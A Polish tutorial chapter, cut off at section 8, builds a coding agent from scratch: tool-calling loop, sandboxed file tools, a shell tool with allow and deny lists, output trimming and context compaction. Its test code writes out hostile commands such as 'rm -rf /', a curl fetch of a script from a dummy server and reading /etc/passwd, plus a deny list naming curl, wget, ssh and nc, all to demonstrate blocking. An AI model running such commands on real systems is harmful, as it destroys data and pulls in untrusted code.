# Część 6 — Pętla agenta od zera

**Poziom: ⭐⭐⭐⭐** · Wymaga: części 2–4 (5 opcjonalnie) · Czas: ~8 h

> **To jest serce kursu.** Zbudujesz od zera agenta klasy Claude Code / OpenClaw: pętlę,
> która czyta pliki, edytuje kod, uruchamia polecenia, pamięta kontekst i wie, kiedy
> zapytać człowieka.
>
> **Nie użyjemy żadnego frameworka.** Po tym rozdziale, gdy spojrzysz na LangChain czy
> Agent SDK, zobaczysz nie magię, a znajome części — i będziesz wiedział, którą z nich
> chcesz, a którą wolisz napisać sam.

```bash
cd ~/Desktop/github_repos/llm-education   # katalog repozytorium (u Ciebie może być inny)
source rig-env.sh
```

---

## Spis treści

| § | Temat | Kluczowa myśl |
| :-- | :-- | :-- |
| [1](#1-czym-agent-naprawdę-jest) | **Anatomia agenta** | to pętla `while`, nie sieć neuronowa |
| [2](#2-szkielet-pętli) | **Szkielet** | minimalna działająca pętla, 60 linii |
| [3](#3-narzędzia--projektowanie-powierzchni) | **Narzędzia** | ⭐ projekt powierzchni decyduje o wszystkim |
| [4](#4-narzędzia-plikowe--read-write-edit) | **Pliki** | `edit` z dopasowaniem dokładnym i kontrolą świeżości |
| [5](#5-narzędzie-shell--z-zatwierdzaniem) | **Shell** | biała lista + zatwierdzanie + limity |
| [6](#6-obserwacje--przycinanie-i-błędy) | **Obserwacje** | wynik narzędzia to nie „tekst", to zasób |
| [7](#7-zarządzanie-kontekstem-w-pętli) | **Kontekst** | budżet, kompakcja, notatnik trwały |
| [8](#8-odzyskiwanie-po-błędach) | **Błędy** | agent musi umieć się pozbierać |
| [9](#9-subagenci--delegacja) | **Subagenci** | świeży kontekst dla zadań czytających |
| [10](#10-dziennik-i-odtwarzanie) | **Dziennik** | ⭐ bez tego nie zdebugujesz agenta |
| [11](#11-złożenie-całości) | **Całość** | `agent.py` — kompletny, działający |

---

## 1. Czym agent naprawdę jest

Odczaruj to od razu:

```python
while True:
    odpowiedz = model(historia)              # 1. MYŚL
    if odpowiedz.chce_narzedzie:
        wynik = wykonaj(odpowiedz.narzedzie) # 2. DZIAŁAJ
        historia.append(wynik)               # 3. OBSERWUJ
    else:
        return odpowiedz.tekst               # 4. KONIEC
```

**To wszystko.** Agent to pętla `think → act → observe`. Cała reszta — cały Claude Code,
cały OpenClaw — to **inżynieria wokół tych czterech linii**:

| Warstwa | Co dodaje | Gdzie w tym rozdziale |
| :-- | :-- | :-- |
| protokół narzędzi | model nie może wywołać nieistniejącego narzędzia | §3 (bazuje na części 3) |
| narzędzia plikowe | czytanie, pisanie, edycja z kontrolą świeżości | §4 |
| shell | wykonywanie poleceń z zatwierdzaniem | §5 |
| obsługa obserwacji | przycinanie ogromnych wyników | §6 |
| kontekst | budżet i kompakcja, żeby pętla nie umarła | §7 |
| odzyskiwanie | co, gdy narzędzie padnie | §8 |
| delegacja | subagenci ze świeżym kontekstem | §9 |
| dziennik | zapis i odtwarzanie każdego kroku | §10 |
| **sandbox** | żeby agent nie zniszczył systemu | **część 7** |
| **szybkość** | żeby to było używalne offline | **część 8** |

⚠️ **Największy błąd początkujących: myśleć, że agent to prompt.** Agent to **harness** —
kod wokół modelu. Model jest wymienny. Harness to Twój produkt.

---

## 2. Szkielet pętli

Zacznij od najmniejszej rzeczy, która działa. Żadnych klas, żadnych abstrakcji.

```bash
mkdir -p $AGENT && cd $AGENT

cat > $AGENT/szkielet.py <<'PYEOF'
#!/usr/bin/env python3
"""Minimalna pętla agenta. 60 linii. Zrozum to, zanim pójdziesz dalej."""
import json, urllib.request

LLM = "http://127.0.0.1:8081"

# --- Narzedzia: nazwa -> (opis, funkcja) --------------------------------
def t_echo(tekst: str) -> str:
    return f"echo: {tekst}"

def t_dodaj(a: str, b: str) -> str:
    try:
        return str(float(a) + float(b))
    except ValueError:
        return "BŁĄD: a i b muszą być liczbami"

NARZEDZIA = {
    "echo":      ("Zwraca podany tekst.",              t_echo),
    "dodaj":     ("Dodaje dwie liczby a i b.",         t_dodaj),
    "odpowiedz": ("Kończy pracę i podaje odpowiedź.",  None),
}

def schemat() -> dict:
    """JSON Schema wymuszajacy poprawne wywolanie (czesc 3 §4)."""
    return {
        "type": "object",
        "properties": {
            "mysl":      {"type": "string"},
            "narzedzie": {"type": "string", "enum": list(NARZEDZIA)},
            "argumenty": {"type": "object"},
        },
        "required": ["mysl", "narzedzie", "argumenty"],
    }

def zapytaj(messages: list[dict]) -> str:
    req = urllib.request.Request(LLM + "/v1/chat/completions",
        data=json.dumps({
            "messages": messages,
            "max_tokens": 500,
            "temperature": 0,        # profil maszynowy (czesc 3 §5.1)
            "repeat_penalty": 1.0,   # P21: kara psuje JSON
            "response_format": {"type": "json_schema", "json_schema": {"schema": schemat()}},
        }).encode(), headers={"Content-Type": "application/json"})
    r = json.load(urllib.request.urlopen(req, timeout=300))
    return r["choices"][0]["message"]["content"]

def petla(zadanie: str, max_tur: int = 8) -> str:
    opis = "\n".join(f"- {n}: {o}" for n, (o, _) in NARZEDZIA.items())
    hist = [
        {"role": "system", "content":
            f"Jesteś agentem. W każdej turze wybierasz JEDNO narzędzie.\n"
            f"Narzędzia:\n{opis}\n\n"
            f"'mysl' to jedno zdanie uzasadnienia. Gdy masz wynik — użyj 'odpowiedz'."},
        {"role": "user", "content": zadanie},
    ]

    for tura in range(1, max_tur + 1):
        surowy = zapytaj(hist)
        krok = json.loads(surowy)                    # gwarantowane schematem
        nazwa, args = krok["narzedzie"], krok["argumenty"]
        print(f"[{tura}] {krok['mysl']}")
        print(f"     → {nazwa}({args})")

        if nazwa == "odpowiedz":
            return args.get("tresc", args.get("odpowiedz", "(brak treści)"))

        _, fn = NARZEDZIA[nazwa]
        try:
            wynik = fn(**args) if fn else "BŁĄD: narzędzie bez implementacji"
        except TypeError as e:
            wynik = f"BŁĄD argumentów: {e}"
        print(f"     ← {str(wynik)[:150]}")

        hist.append({"role": "assistant", "content": surowy})
        hist.append({"role": "user", "content": f"Wynik {nazwa}: {wynik}"})

    return "(przerwano: limit tur)"

if __name__ == "__main__":
    import sys
    z = sys.argv[1] if len(sys.argv) > 1 else "Ile wynosi 1247.50 plus 892.30? Użyj narzędzia."
    print(f"ZADANIE: {z}\n")
    print(f"\n=== WYNIK ===\n{petla(z)}")
PYEOF
chmod +x $AGENT/szkielet.py
```

Uruchom:

```bash
pkill -f llama-server; sleep 2
export HIP_VISIBLE_DEVICES=0,1
$LB/llama-server -m $OSS20 -ngl 999 -c 16384 --port 8081 --host 127.0.0.1 --no-warmup &
sleep 25

cd $AGENT && python3 szkielet.py
```

### 2.1 Przeczytaj to jeszcze raz i zauważ pięć rzeczy

1. **Pętla ma twardy limit** (`max_tur`). Agent bez limitu to rachunek za prąd albo
   nieskończona pętla.
2. **`assistant` dostaje surowy JSON**, nie sparsowany. Model widzi dokładnie to, co
   wygenerował — spójność historii.
3. **Wynik narzędzia wraca jako `user`.** To konwencja — model traktuje go jako
   „obserwację ze świata".
4. **`NARZEDZIA[nazwa]` jest bezpieczne**, bo `enum` w schemacie gwarantuje istnienie.
   Zero `KeyError`.
5. **`odpowiedz` to też narzędzie.** To jest wzorzec, który upraszcza wszystko: agent
   zawsze wywołuje narzędzie, nigdy nie „po prostu odpowiada". Jedna ścieżka kodu.

⚠️ **Pułapka P37 (nowa): model może zapomnieć wywołać `odpowiedz`.**
Zwłaszcza słabsze modele kończą turę tekstem typu „Teraz obliczę sumę" — bez wywołania
narzędzia. Schemat to blokuje (musi być pole `narzedzie`), **ale model może wpaść
w pętlę powtarzania tego samego narzędzia.** Obrona w §8.

---

## 3. Narzędzia — projektowanie powierzchni

⭐ **To jest najważniejsza decyzja projektowa w całym agencie.** Ważniejsza niż wybór
modelu.

### 3.1 Zasada: jedno narzędzie = jedna intencja, którą da się skontrolować

```
❌ ZŁE:   bash("rm -rf /tmp/stare && cp nowe.txt /tmp/")
          → harness widzi jeden nieprzezroczysty string
          → nie da się zatwierdzać, logować ani ograniczać

✅ DOBRE: usun_plik(sciezka="/tmp/stare")
          kopiuj(zrodlo="nowe.txt", cel="/tmp/")
          → harness widzi TYPOWANE argumenty
          → możesz zatwierdzać, sprawdzać ścieżki, audytować
```

💡 **Reguła praktyczna:** zacznij od `bash` (daje szerokość działania), a **awansuj
do dedykowanego narzędzia**, gdy potrzebujesz jednej z czterech rzeczy:

| Potrzeba | Przykład |
| :-- | :-- |
| **zatwierdzanie** | `usun_plik` da się zapytać „na pewno?", `bash -c "rm ..."` nie |
| **kontrola świeżości** | `edytuj` może odmówić, jeśli plik zmienił się od czytania |
| **specjalny UI** | `zapytaj_uzytkownika` renderuje się jako pytanie, nie jako tekst |
| **równoległość** | `grep` jest bezpieczny równolegle, `git push` nie |

### 3.2 Powierzchnia, którą zbudujemy

Dokładnie taka, jaką ma Claude Code — bo to zestaw sprawdzony w boju:

| Narzędzie | Argumenty | Ryzyko |
| :-- | :-- | :-- |
| `czytaj` | `sciezka`, `od_linii?`, `ile_linii?` | 🟢 brak |
| `szukaj_plikow` | `wzorzec` | 🟢 brak |
| `szukaj_w_tresci` | `wzorzec`, `katalog?` | 🟢 brak |
| `zapisz` | `sciezka`, `tresc` | 🟡 nadpisuje |
| `edytuj` | `sciezka`, `stary_tekst`, `nowy_tekst` | 🟡 zmienia |
| `powloka` | `polecenie` | 🔴 **wszystko** |
| `zapytaj_uzytkownika` | `pytanie`, `opcje?` | 🟢 brak |
| `zapisz_ustalenie` | `klucz`, `wartosc` | 🟢 notatnik trwały |
| `odpowiedz` | `tresc` | 🟢 koniec |

### 3.3 Opisy narzędzi — tu wygrywa się niezawodność

⭐ **Najważniejsza rzecz o opisach: napisz, KIEDY użyć narzędzia, nie tylko CO robi.**

```python
# ❌ SŁABO — model nie wie, kiedy tego użyć
"czytaj": "Czyta plik."

# ✅ DOBRZE — warunek uruchomienia jest jawny
"czytaj": ("Czyta plik tekstowy i zwraca jego treść z numerami linii. "
           "Użyj ZAWSZE przed edycją pliku — musisz znać dokładną treść, "
           "żeby podać poprawny stary_tekst do narzędzia edytuj.")
```

💡 **Lokalny model 20B jest znacznie bardziej wrażliwy na opisy niż duży model.** Duży
domyśli się z nazwy. Mały potrzebuje instrukcji. **Każde 10 słów w opisie warunku
uruchomienia zwraca się wielokrotnie.**

---

## 4. Narzędzia plikowe — `read`, `write`, `edit`

```bash
cat > $AGENT/narzedzia_plikowe.py <<'PYEOF'
#!/usr/bin/env python3
"""Narzedzia plikowe agenta: czytaj / zapisz / edytuj / szukaj.

KLUCZOWE ZASADY:
 1. Wszystko ograniczone do KATALOGU ROBOCZEGO (piaskownica sciezkowa).
 2. 'edytuj' wymaga DOKLADNEGO dopasowania - to celowe.
 3. Kontrola swiezosci: nie mozna nadpisac pliku, ktorego agent nie czytal.
"""
import fnmatch, hashlib, os, re, subprocess

class Pliki:
    def __init__(self, katalog_roboczy: str, max_znakow: int = 20000):
        self.root = os.path.realpath(os.path.expanduser(os.path.expandvars(katalog_roboczy)))
        os.makedirs(self.root, exist_ok=True)
        self.max_znakow = max_znakow
        # sciezka -> hash tresci w momencie czytania (kontrola swiezosci)
        self._przeczytane: dict[str, str] = {}

    # ---------- piaskownica sciezkowa ------------------------------------
    def _bezpieczna(self, sciezka: str) -> str:
        """Zwraca realpath WEWNATRZ root albo rzuca wyjatek.

        realpath rozwiazuje '..' ORAZ symlinki - to jest istotne,
        bo agent moze stworzyc symlink i przez niego wyjsc.
        """
        p = os.path.realpath(os.path.join(self.root, os.path.expanduser(os.path.expandvars(sciezka))))
        if p != self.root and not p.startswith(self.root + os.sep):
            raise PermissionError(f"ścieżka poza katalogiem roboczym: {sciezka}")
        return p

    @staticmethod
    def _hash(tresc: str) -> str:
        return hashlib.sha256(tresc.encode()).hexdigest()[:16]

    # ---------- czytanie -------------------------------------------------
    def czytaj(self, sciezka: str, od_linii: int = 1, ile_linii: int = 0) -> str:
        p = self._bezpieczna(sciezka)
        if not os.path.isfile(p):
            return f"BŁĄD: nie ma pliku {sciezka}"
        with open(p, encoding="utf-8", errors="replace") as f:
            linie = f.readlines()
        self._przeczytane[p] = self._hash("".join(linie))

        od = max(1, int(od_linii))
        do = len(linie) if not ile_linii else min(len(linie), od + int(ile_linii) - 1)
        wyc = linie[od-1:do]
        out = "".join(f"{od+i:5d}| {l}" for i, l in enumerate(wyc))
        if len(out) > self.max_znakow:
            out = out[:self.max_znakow] + f"\n[... przycięto, plik ma {len(linie)} linii]"
        naglowek = f"# {sciezka} (linie {od}-{do} z {len(linie)})\n"
        return naglowek + out

    # ---------- zapis ----------------------------------------------------
    def zapisz(self, sciezka: str, tresc: str) -> str:
        p = self._bezpieczna(sciezka)
        istnial = os.path.isfile(p)
        if istnial:
            biezacy = self._hash(open(p, encoding="utf-8", errors="replace").read())
            if self._przeczytane.get(p) != biezacy:
                return (f"ODMOWA: plik {sciezka} istnieje i nie został przeczytany "
                        f"w aktualnej wersji. Użyj najpierw 'czytaj'.")
        os.makedirs(os.path.dirname(p) or self.root, exist_ok=True)
        with open(p, "w", encoding="utf-8") as f:
            f.write(tresc)
        self._przeczytane[p] = self._hash(tresc)
        return f"OK: {'nadpisano' if istnial else 'utworzono'} {sciezka} ({len(tresc)} znaków)"

    # ---------- edycja ---------------------------------------------------
    def edytuj(self, sciezka: str, stary_tekst: str, nowy_tekst: str) -> str:
        """Zamienia DOKLADNIE jedno wystapienie. Blad, jesli 0 albo >1."""
        p = self._bezpieczna(sciezka)
        if not os.path.isfile(p):
            return f"BŁĄD: nie ma pliku {sciezka}"
        tresc = open(p, encoding="utf-8", errors="replace").read()

        if self._przeczytane.get(p) != self._hash(tresc):
            return (f"ODMOWA: {sciezka} zmienił się od Twojego ostatniego czytania "
                    f"(albo go nie czytałeś). Użyj 'czytaj' i spróbuj ponownie.")

        n = tresc.count(stary_tekst)
        if n == 0:
            return ("BŁĄD: nie znalazłem stary_tekst w pliku. Pamiętaj: NIE dołączaj "
                    "numerów linii ani prefiksu '  123| ' z wyjścia narzędzia czytaj.")
        if n > 1:
            return (f"BŁĄD: stary_tekst występuje {n} razy — musi być unikalny. "
                    f"Dodaj więcej kontekstu (linię przed i po).")

        nowa = tresc.replace(stary_tekst, nowy_tekst, 1)
        with open(p, "w", encoding="utf-8") as f:
            f.write(nowa)
        self._przeczytane[p] = self._hash(nowa)
        return f"OK: podmieniono w {sciezka} ({len(stary_tekst)} → {len(nowy_tekst)} znaków)"

    # ---------- szukanie -------------------------------------------------
    def szukaj_plikow(self, wzorzec: str) -> str:
        out = []
        for dirpath, dirnames, files in os.walk(self.root):
            dirnames[:] = [d for d in dirnames if not d.startswith((".git", "__pycache__", ".venv"))]
            for f in files:
                rel = os.path.relpath(os.path.join(dirpath, f), self.root)
                if fnmatch.fnmatch(rel, wzorzec) or fnmatch.fnmatch(f, wzorzec):
                    out.append(rel)
        if not out:
            return f"brak plików pasujących do {wzorzec!r}"
        return f"{len(out)} plików:\n" + "\n".join(sorted(out)[:200])

    def szukaj_w_tresci(self, wzorzec: str, katalog: str = ".") -> str:
        p = self._bezpieczna(katalog)
        try:
            rx = re.compile(wzorzec)
        except re.error as e:
            return f"BŁĄD: zły regex: {e}"
        trafienia = []
        for dirpath, dirnames, files in os.walk(p):
            dirnames[:] = [d for d in dirnames if not d.startswith((".git", "__pycache__", ".venv"))]
            for f in files:
                fp = os.path.join(dirpath, f)
                try:
                    with open(fp, encoding="utf-8", errors="ignore") as fh:
                        for i, linia in enumerate(fh, 1):
                            if rx.search(linia):
                                rel = os.path.relpath(fp, self.root)
                                trafienia.append(f"{rel}:{i}: {linia.rstrip()[:160]}")
                                if len(trafienia) >= 100:
                                    return "\n".join(trafienia) + "\n[... przycięto na 100]"
                except OSError:
                    continue
        return "\n".join(trafienia) if trafienia else f"brak trafień dla {wzorzec!r}"
PYEOF
```

### 4.1 ⭐ Dlaczego `edytuj` wymaga dokładnego dopasowania

To wygląda na uciążliwe. **Jest zamierzone i jest kluczowe.**

| Alternatywa | Dlaczego jest gorsza |
| :-- | :-- |
| „podmień linię 42" | numery linii **przesuwają się** po każdej edycji → agent psuje plik |
| „podmień przez regex" | model pisze zły regex i **kasuje pół pliku** — bez ostrzeżenia |
| **dokładny tekst, unikalny** | ✅ albo się udaje, albo **jawnie odmawia** — nigdy cicho nie psuje |

⭐ **To jest wzorzec „fail loud".** Lepiej, żeby agent dostał błąd i spróbował ponownie,
niż żeby po cichu uszkodził plik. **Cichy błąd w agencie edytującym kod to godziny
debugowania.**

### 4.2 ⭐ Kontrola świeżości — pułapka, o której nikt nie mówi

Zwróć uwagę na `self._przeczytane`. Scenariusz bez niej:

```
1. agent czyta plik.py              (widzi wersję A)
2. agent myśli 30 sekund
3. TY zapisujesz plik.py w edytorze (wersja B)
4. agent robi edytuj() na wersji A  → NADPISUJE Twoją zmianę
```

⚠️ **Pułapka P38 (nowa): agent bez kontroli świeżości zjada zmiany człowieka.**
Hash treści przy czytaniu i weryfikacja przy zapisie to ~5 linii kodu i **jedyna obrona**.
Claude Code robi dokładnie to samo.

### 4.3 Test narzędzi plikowych

```bash
cd $AGENT && python3 - <<'PYEOF'
import sys, os
sys.path.insert(0, os.environ["AGENT"])
from narzedzia_plikowe import Pliki

p = Pliki("$AGENT/praca")

print(p.zapisz("test.py", "def suma(a, b):\n    return a + b\n\nprint(suma(2, 3))\n"))
print()
print(p.czytaj("test.py"))
print()

# Edycja bez czytania -> odmowa? (czytalismy wyzej, wiec przejdzie)
print(p.edytuj("test.py", "return a + b", "return a + b  # poprawione"))
print()

# Nieunikalny stary_tekst -> blad
print(p.zapisz("dwa.py", "x = 1\nx = 1\n"))
print(p.czytaj("dwa.py"))
print(p.edytuj("dwa.py", "x = 1", "x = 2"))
print()

# Wyjscie z piaskownicy -> wyjatek
try:
    p.czytaj("../../../etc/passwd")
except PermissionError as e:
    print(f"✅ zablokowano: {e}")

print()
print(p.szukaj_w_tresci("def "))
PYEOF
```

**Sprawdź, że:** edycja nieunikalna daje błąd, wyjście z katalogu daje `PermissionError`,
a numery linii w wyjściu `czytaj` są obecne (i że model musi je pominąć w `stary_tekst` —
o czym mówi mu komunikat błędu).

---

## 5. Narzędzie shell — z zatwierdzaniem

🔴 **Najbardziej ryzykowne narzędzie.** Tu implementujemy tylko kontrolę *logiczną* —
prawdziwa izolacja (namespace'y, `bwrap`) to **część 7**.

```bash
cat > $AGENT/narzedzie_powloka.py <<'PYEOF'
#!/usr/bin/env python3
"""Narzedzie powloki z biala lista, zatwierdzaniem i limitami.

UWAGA: to jest kontrola LOGICZNA, nie izolacja systemowa.
Prawdziwa piaskownica (bwrap, namespace'y) - czesc 7.
"""
import os, re, shlex, subprocess

# Polecenia dozwolone bez pytania - tylko ODCZYT
BEZ_PYTANIA = {
    "ls", "cat", "head", "tail", "wc", "grep", "find", "file", "stat",
    "pwd", "echo", "date", "which", "du", "df", "sort", "uniq", "diff",
    "python3", "pip", "git",          # git: patrz kontrola podpolecen
}

# Polecenia ZAWSZE wymagajace zgody
WYMAGA_ZGODY = {"rm", "mv", "cp", "chmod", "chown", "mkdir", "rmdir",
                "kill", "pkill", "tee", "truncate", "ln"}

# Nigdy, pod zadnym pozorem
ZAKAZANE = {"sudo", "su", "dd", "mkfs", "fdisk", "shutdown", "reboot",
            "systemctl", "apt", "apt-get", "curl", "wget", "ssh", "scp", "nc"}

# Podpolecenia gita, ktore zmieniaja stan zdalny
GIT_WYMAGA_ZGODY = {"push", "reset", "clean", "rebase", "checkout", "restore", "commit"}

class Powloka:
    def __init__(self, katalog_roboczy: str, timeout: int = 60,
                 max_wyjscia: int = 10000, tryb_zgody: str = "pytaj"):
        """tryb_zgody: 'pytaj' | 'odrzucaj' | 'pozwalaj' (ostatni tylko w testach!)"""
        self.root = os.path.realpath(os.path.expanduser(os.path.expandvars(katalog_roboczy)))
        os.makedirs(self.root, exist_ok=True)
        self.timeout = timeout
        self.max_wyjscia = max_wyjscia
        self.tryb_zgody = tryb_zgody
        self.dziennik: list[tuple[str, str]] = []

    # ---------- analiza polecenia ---------------------------------------
    def _ocen(self, polecenie: str) -> tuple[str, str]:
        """Zwraca ('ok'|'zgoda'|'blok', powod)."""
        # Operatory powloki: lancuchy ukrywaja polecenia przed kontrola
        if re.search(r"[;&|`]|\$\(|>>|>", polecenie):
            return "blok", ("zabronione operatory powłoki (; & | ` $() > >>). "
                            "Wykonaj jedno polecenie na raz.")
        try:
            czesci = shlex.split(polecenie)
        except ValueError as e:
            return "blok", f"nie mogę sparsować polecenia: {e}"
        if not czesci:
            return "blok", "puste polecenie"

        prog = os.path.basename(czesci[0])
        if prog in ZAKAZANE:
            return "blok", f"{prog} jest na liście zakazanych"
        if prog == "git" and len(czesci) > 1 and czesci[1] in GIT_WYMAGA_ZGODY:
            return "zgoda", f"git {czesci[1]} zmienia stan repozytorium"
        if prog in WYMAGA_ZGODY:
            return "zgoda", f"{prog} modyfikuje pliki"
        if prog in BEZ_PYTANIA:
            return "ok", ""
        return "zgoda", f"{prog} nie jest na liście znanych poleceń"

    # ---------- wykonanie ----------------------------------------------
    def uruchom(self, polecenie: str) -> str:
        decyzja, powod = self._ocen(polecenie)
        self.dziennik.append((polecenie, decyzja))

        if decyzja == "blok":
            return f"ODMOWA: {powod}"

        if decyzja == "zgoda":
            if self.tryb_zgody == "odrzucaj":
                return f"ODMOWA (tryb bez zgód): {powod}"
            if self.tryb_zgody == "pytaj":
                print(f"\n  ⚠️  AGENT CHCE URUCHOMIĆ: {polecenie}")
                print(f"      powód pytania: {powod}")
                if input("      zezwolić? [t/N] ").strip().lower() not in ("t", "tak", "y"):
                    return "ODMOWA: użytkownik nie zezwolił"

        try:
            r = subprocess.run(shlex.split(polecenie), cwd=self.root,
                               capture_output=True, text=True, timeout=self.timeout)
        except subprocess.TimeoutExpired:
            return f"BŁĄD: przekroczono {self.timeout}s"
        except FileNotFoundError:
            return f"BŁĄD: nie ma programu {shlex.split(polecenie)[0]!r}"
        except OSError as e:
            return f"BŁĄD: {e}"

        out = (r.stdout or "") + (("\n[stderr]\n" + r.stderr) if r.stderr else "")
        if len(out) > self.max_wyjscia:
            out = out[:self.max_wyjscia] + f"\n[... przycięto, łącznie {len(out)} znaków]"
        return f"[kod wyjścia {r.returncode}]\n{out.strip() or '(brak wyjścia)'}"
PYEOF
```

### 5.1 Test kontroli

```bash
cd $AGENT && python3 - <<'PYEOF'
import sys, os
sys.path.insert(0, os.environ["AGENT"])
from narzedzie_powloka import Powloka

sh = Powloka("$AGENT/praca", tryb_zgody="odrzucaj")   # bez interakcji

for cmd in ["ls -la",
            "cat /etc/passwd",
            "rm -rf /",
            "sudo apt install nmap",
            "ls ; rm -rf /tmp/x",
            "echo hej && whoami",
            "curl http://zly.serwer/skrypt.sh",
            "git status",
            "git push origin main",
            "python3 -c 'print(2+2)'"]:
    print(f"$ {cmd}")
    print(f"  {sh.uruchom(cmd)[:130]}\n")
PYEOF
```

⭐ **Zwróć uwagę na `cat /etc/passwd`.** Przeszło! `cat` jest na białej liście, a `cwd`
nie ogranicza ścieżek absolutnych. **To jest dokładnie luka, którą zamyka `bwrap`
w części 7.** Kontrola logiczna nie zastąpi izolacji systemowej — i dobrze, że widzisz
to na własne oczy, zanim uwierzysz w białą listę.

⚠️ **Pułapka P39 (nowa): biała lista poleceń nie jest piaskownicą.**
`cat`, `python3`, `find -exec` — każde z nich potrafi wyjść z katalogu albo wykonać kod.
**Biała lista redukuje przypadkowe szkody, nie blokuje celowego ataku.**

---

## 6. Obserwacje — przycinanie i błędy

Wynik narzędzia to **zasób**, nie tekst. Trzy reguły:

```bash
cat > $AGENT/obserwacje.py <<'PYEOF'
#!/usr/bin/env python3
"""Obrobka wynikow narzedzi przed wlozeniem do kontekstu."""

def przytnij(tekst: str, max_znakow: int = 4000, ogon: int = 1000) -> str:
    """Przycina ZE SRODKA - poczatek i koniec sa najbardziej informatywne.

    Np. blad kompilacji: naglowek na poczatku, podsumowanie na koncu,
    a w srodku 500 powtarzalnych linii.
    """
    if len(tekst) <= max_znakow:
        return tekst
    glowa = max_znakow - ogon
    pominieto = len(tekst) - glowa - ogon
    return (tekst[:glowa]
            + f"\n\n[... pominięto {pominieto} znaków ze środka ...]\n\n"
            + tekst[-ogon:])

def sformatuj(nazwa: str, args: dict, wynik: str, max_znakow: int = 4000) -> str:
    """Obserwacja z jawnym oznaczeniem bledu - model musi to WIDZIEC."""
    blad = str(wynik).startswith(("BŁĄD", "ODMOWA", "[kod wyjścia 1", "[kod wyjścia 2"))
    znacznik = "❌ BŁĄD" if blad else "✅"
    return f"{znacznik} {nazwa}({_skrot(args)})\n{przytnij(str(wynik), max_znakow)}"

def _skrot(args: dict) -> str:
    """Skraca dlugie argumenty w naglowku obserwacji."""
    czesci = []
    for k, v in args.items():
        s = str(v)
        czesci.append(f"{k}={s[:60]+'…' if len(s) > 60 else s!r}")
    return ", ".join(czesci)
PYEOF
```

⚠️ **Pułapka P40 (nowa): jedna obserwacja może zabić kontekst.**
`cat duzy_plik.log` albo `find /` zwraca megabajty. Bez przycinania **jedno wywołanie
narzędzia wypełnia całe okno kontekstu** i agent traci całą historię pracy.
**Przycinanie jest obowiązkowe, nie opcjonalne.**

💡 **Dlaczego przycinamy ze środka, nie z końca.** W komunikacie błędu informacja jest
na początku (co się stało) i na końcu (podsumowanie). Środek to zwykle powtarzalny szum.
Przycięcie z końca gubi podsumowanie — najcenniejszą część.

---

## 7. Zarządzanie kontekstem w pętli

```bash
cat > $AGENT/kontekst.py <<'PYEOF'
#!/usr/bin/env python3
"""Budzet kontekstu + kompakcja + notatnik trwaly."""
import json, os, subprocess, urllib.request

LB  = os.path.expanduser("~/llama.cpp/build/bin")
# ⚠️ Bylo na sztywno "http://127.0.0.1:8081" - ignorowalo LLM_URL, ktory
# agent.py (11) juz respektuje. Nadpisanie portu w jednym miejscu, a nie
# w drugim, cicho psulo kompakcje po przelaczeniu serwera.
LLM = os.environ.get("LLM_URL", "http://127.0.0.1:8081")

class Kontekst:
    def __init__(self, model_sciezka: str, n_ctx: int = 16384,
                 rezerwa: int = 2000, prog_kompakcji: float = 0.75):
        self.model  = os.path.expanduser(os.path.expandvars(model_sciezka))
        self.n_ctx  = n_ctx
        self.rezerwa = rezerwa
        self.prog   = prog_kompakcji
        self._cache: dict[str, int] = {}

    # ---------- liczenie tokenow (P20: tym samym tokenizerem!) ----------
    def tokeny(self, tekst: str) -> int:
        klucz = tekst[:200] + str(len(tekst))
        if klucz in self._cache:
            return self._cache[klucz]
        try:
            r = subprocess.run([f"{LB}/llama-tokenize", "-m", self.model, "--stdin"],
                               input=tekst, capture_output=True, text=True, timeout=60)
            n = len([l for l in r.stdout.splitlines() if "->" in l]) or max(1, len(tekst)//3)
        except Exception:
            n = max(1, len(tekst) // 3)        # zgrubne oszacowanie awaryjne
        if len(self._cache) < 2048:
            self._cache[klucz] = n
        return n

    def zuzycie(self, messages: list[dict]) -> int:
        return sum(self.tokeny(m["content"]) for m in messages)

    def trzeba_kompaktowac(self, messages: list[dict]) -> bool:
        return self.zuzycie(messages) > (self.n_ctx - self.rezerwa) * self.prog

    # ---------- kompakcja ---------------------------------------------
    def kompaktuj(self, messages: list[dict], zostaw: int = 6) -> list[dict]:
        if len(messages) <= zostaw + 2:
            return messages
        system, stare, swieze = messages[0], messages[1:-zostaw], messages[-zostaw:]
        if not stare:
            return messages

        tekst = "\n".join(f"{m['role']}: {m['content'][:1200]}" for m in stare)
        req = urllib.request.Request(LLM + "/v1/chat/completions",
            data=json.dumps({
              "messages": [
                {"role": "system", "content":
                   "Streszczasz historię pracy agenta. Zachowaj ZWIĘŹLE: zadanie, "
                   "ustalone fakty (nazwy plików, liczby, błędy), co próbowano i z jakim "
                   "skutkiem, co zostało. Pomiń powtórzenia i treści plików. Max 350 słów."},
                {"role": "user", "content": tekst}],
              "max_tokens": 700, "temperature": 0.2,
            }).encode(), headers={"Content-Type": "application/json"})
        try:
            s = json.load(urllib.request.urlopen(req, timeout=300))["choices"][0]["message"]["content"]
        except Exception as e:
            # Awaryjnie: zamiast streszczenia po prostu utnij
            return [system] + swieze
        return [system,
                {"role": "user", "content": f"[STRESZCZENIE {len(stare)} POPRZEDNICH TUR]\n{s}"},
                *swieze]

class Notatnik:
    """Trwala pamiec agenta POZA kontekstem (P31: kompakcja gubi liczby)."""
    def __init__(self, plik: str):
        self.plik = os.path.expanduser(os.path.expandvars(plik))
        os.makedirs(os.path.dirname(self.plik), exist_ok=True)
        self.dane: dict[str, str] = {}
        if os.path.exists(self.plik):
            try:
                self.dane = json.load(open(self.plik, encoding="utf-8"))
            except (OSError, json.JSONDecodeError):
                self.dane = {}

    def zapisz(self, klucz: str, wartosc: str) -> str:
        self.dane[str(klucz)] = str(wartosc)
        json.dump(self.dane, open(self.plik, "w", encoding="utf-8"),
                  ensure_ascii=False, indent=2)
        return f"OK: zapisano ustalenie {klucz!r}"

    def jako_tekst(self) -> str:
        if not self.dane:
            return ""
        return "USTALENIA (pamięć trwała):\n" + "\n".join(
            f"  {k} = {v}" for k, v in self.dane.items())
PYEOF
```

### 7.1 ⭐ Notatnik trwały — wzorzec, którego brakuje w większości tutoriali

Pułapka **P31** z części 4: kompakcja gubi dokładne liczby. Rozwiązanie:

```
kontekst  = pamięć krótkotrwała, kompaktowalna, może zgubić szczegół
notatnik  = pamięć trwała, plik JSON, NIE gubi nic
```

Agent po każdym ważnym ustaleniu wywołuje `zapisz_ustalenie("numer_faktury", "FV/2025/143")`.
Notatnik jest **doklejany do promptu systemowego przy każdej turze** — więc przeżywa
kompakcję. **To jest tanie i rozwiązuje realny problem.**

---

## 8. Odzyskiwanie po błędach

Agent musi umieć się pozbierać. Cztery mechanizmy:

```bash
